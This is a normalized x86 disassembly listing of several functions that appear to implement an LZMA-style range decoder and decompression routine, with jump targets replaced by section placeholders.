mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov [ edx + 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x88 ] 0x0
mov eax 0x6
jmp r-xdata
mov eax 0x9
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x74 ] 0x0
jmp r-xdata
mov eax 0x9
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ecx
mov eax 0x1
jmp r-xdata
sub_408b80
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x24 ]
push eax
call sub_424fc0
add esp 0xc
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
add eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x24 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
add ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x2c ] ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
sub edx [ ecx + 0x2c ]
cmp edx [ ebp + 0x10 ]
ja r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
mov [ eax + 0x30 ] edx
sub_408bf0
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp + 0x14 ]
mov [ edx ] 0x0
mov eax [ ebp + 0x1c ]
mov [ eax ] 0x0
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x1
xor eax eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x78 ] 0x9
jne r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x78 ] 0x6
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0x18 ]
sub edx [ ecx ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x30 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x74 ]
cmp ecx [ ebp - 0x10 ]
ja r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x78 ] 0x7
je r-xdata
mov eax [ ebp + 0x1c ]
mov [ eax ] 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x7c ]
and edx 0x80
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x74 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x30 ] 0x1
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
cmp ecx [ ebp - 0x18 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x78 ] 0x6
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
cmp ecx [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
add ecx 0x1
mov edx [ ebp + 0x14 ]
mov [ edx ] ecx
mov eax [ ebp + 0x10 ]
mov cl [ eax ]
mov [ ebp - 0x9 ] cl
movzx edx [ ebp - 0x9 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_408960
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x78 ] eax
mov edx [ ebp + 0x10 ]
add edx 0x1
mov [ ebp + 0x10 ] edx
jmp r-xdata
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x3
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0x70 ]
jbe r-xdata
mov edx [ ebp + 0x8 ]
movzx eax [ edx + 0x7c ]
sar eax 0x5
and eax 0x3
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x78 ] 0x6
jne r-xdata
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x3
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x78 ] 0x8
je r-xdata
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp - 0x30 ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40b510
add esp 0x18
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
add edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x70 ]
sub edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x70 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
sub edx [ ebp - 0x14 ]
mov [ ebp - 0x48 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x74 ]
sub ecx [ ebp - 0x48 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x74 ] ecx
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x38 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x70 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0x10 ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x7c ]
cmp edx 0x1
jne r-xdata
mov ecx [ ebp + 0x1c ]
cmp [ ecx ] 0x3
jne r-xdata
mov eax [ ebp - 0x38 ]
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x34 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x28 ] ecx
cmp [ ebp - 0x3c ] 0x0
jle r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x80 ] 0x0
jne r-xdata
mov edx [ ebp - 0x34 ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_408b80
add esp 0xc
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
add edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x74 ]
sub edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x74 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x74 ] 0x0
jne r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x84 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x88 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp + 0x1c ]
cmp [ eax ] 0x4
jne r-xdata
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
mov edx [ ebp - 0x20 ]
push edx
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40b3d0
add esp 0xc
mov edx [ ebp + 0x8 ]
mov [ edx + 0x80 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x84 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x78 ] 0x7
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x84 ] 0x0
je r-xdata
mov eax 0x1
jmp r-xdata
mov [ ebp - 0x44 ] 0x7
mov [ ebp - 0x44 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x80 ] 0x0
push 0x0
mov edx [ ebp - 0x24 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40b3d0
add esp 0xc
mov eax 0x1
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x1c ]
mov [ ecx ] 0x2
mov edx [ ebp + 0x1c ]
cmp [ edx ] 0x4
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x44 ]
mov [ edx + 0x78 ] eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x74 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x70 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x78 ] 0x0
sub_408ff0
push ebp
mov ebp esp
sub esp 0xe4
mov [ ebp - 0x98 ] edx
mov [ ebp - 0x24 ] ecx
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x3c ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x2c ] eax
mov ecx 0x4
imul ecx ecx 0x0
mov edx [ ebp - 0x24 ]
mov eax [ edx + ecx + 0x38 ]
mov [ ebp - 0x44 ] eax
mov ecx 0x4
shl ecx 0x0
mov edx [ ebp - 0x24 ]
mov eax [ edx + ecx + 0x38 ]
mov [ ebp - 0x64 ] eax
mov ecx 0x4
shl ecx 0x1
mov edx [ ebp - 0x24 ]
mov eax [ edx + ecx + 0x38 ]
mov [ ebp - 0x6c ] eax
mov ecx 0x4
imul ecx ecx 0x3
mov edx [ ebp - 0x24 ]
mov eax [ edx + ecx + 0x38 ]
mov [ ebp - 0x7c ] eax
mov ecx [ ebp - 0x24 ]
mov edx 0x1
mov ecx [ ecx + 0x8 ]
shl edx cl
sub edx 0x1
mov [ ebp - 0xd8 ] edx
mov eax [ ebp - 0x24 ]
mov edx 0x1
mov ecx [ eax + 0x4 ]
shl edx cl
sub edx 0x1
mov [ ebp - 0xe0 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
mov [ ebp - 0xcc ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x54 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x60 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x2c ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x30 ]
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x28 ] 0x0
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x1c ]
mov [ ecx ] ax
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x3c ]
lea ecx [ eax + edx * 2 + 0x180 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x1c ]
movzx eax [ edx ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x3c ]
add eax 0xe6c
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
shl edx 0x8
mov eax [ ebp - 0x18 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
cmp [ ebp - 0x40 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x5
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax 0x800
sub eax [ ebp - 0x8 ]
shr eax 0x5
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] ax
mov edx [ ebp - 0x2c ]
add edx 0xc
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x3c ]
add eax 0x664
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov [ ebp - 0xb0 ] edx
mov ecx [ ebp - 0x60 ]
mov [ ebp - 0xb0 ] ecx
jmp r-xdata
cmp [ ebp - 0x2c ] 0x7
jae r-xdata
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax * 2 + 0x198 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
movzx ecx [ eax ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
movzx eax [ edx ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x44 ]
jae r-xdata
cmp [ ebp - 0x2c ] 0x4
jae r-xdata
mov eax [ ebp - 0x40 ]
and eax [ ebp - 0xe0 ]
mov ecx [ ebp - 0xcc ]
shl eax cl
mov ecx [ ebp - 0x54 ]
add ecx [ ebp - 0xb0 ]
movzx edx [ ecx - 0x1 ]
mov ecx 0x8
sub ecx [ ebp - 0xcc ]
sar edx cl
add eax edx
imul eax eax 0x300
mov ecx [ ebp - 0x1c ]
lea edx [ ecx + eax * 2 ]
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
shl edx 0x8
mov eax [ ebp - 0x18 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xc8 ] 0x0
mov eax [ ebp - 0x60 ]
mov [ ebp - 0xc8 ] eax
jmp r-xdata
mov [ ebp - 0xa8 ] 0x3
mov eax [ ebp - 0x2c ]
mov [ ebp - 0xa8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x5
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax * 2 + 0x1b0 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
movzx ecx [ eax ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x2c ]
shl eax 0x4
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax * 2 + 0x1e0 ]
mov eax [ ebp - 0x78 ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x1c ]
movzx eax [ edx ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x38 ]
mov [ eax ] dx
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
movzx eax [ edx ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax 0x800
sub eax [ ebp - 0x8 ]
shr eax 0x5
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x38 ]
mov [ ecx ] ax
mov edx [ ebp - 0x78 ]
shl edx 0x3
mov eax [ ebp - 0x1c ]
lea ecx [ eax + edx * 2 + 0x4 ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x88 ] 0x0
mov [ ebp - 0x70 ] 0x8
jmp r-xdata
mov [ ebp - 0x9c ] 0x6
mov [ ebp - 0x9c ] 0x3
jmp r-xdata
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x44 ]
add ecx [ ebp - 0xc8 ]
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x14 ]
movzx ecx [ eax + ecx ]
mov [ ebp - 0x94 ] ecx
mov [ ebp - 0x68 ] 0x100
cmp [ ebp - 0x2c ] 0xa
jae r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0xa8 ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x34 ] 0x1
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
shl edx 0x8
mov eax [ ebp - 0x18 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
shl edx 0x8
mov eax [ ebp - 0x18 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x28 ] 0x1
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x2c ]
sub edx [ ebp - 0x9c ]
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x34 ] 0x1
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x34 ] ecx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x1c ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp - 0x34 ]
add ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x5
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax * 2 + 0x1c8 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
movzx ecx [ eax ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x84 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x1c ]
mov [ eax ] dx
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax 0x800
sub eax [ ebp - 0x8 ]
shr eax 0x5
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] ax
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x44 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x38 ]
mov [ eax ] dx
mov ecx [ ebp - 0x1c ]
add ecx 0x204
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x88 ] 0x10
mov [ ebp - 0x70 ] 0x100
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax 0x800
sub eax [ ebp - 0x8 ]
shr eax 0x5
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x38 ]
mov [ ecx ] ax
mov edx [ ebp - 0x78 ]
shl edx 0x3
mov eax [ ebp - 0x1c ]
lea ecx [ eax + edx * 2 + 0x104 ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x88 ] 0x8
mov [ ebp - 0x70 ] 0x8
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x80 ]
mov [ eax ] dx
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x34 ]
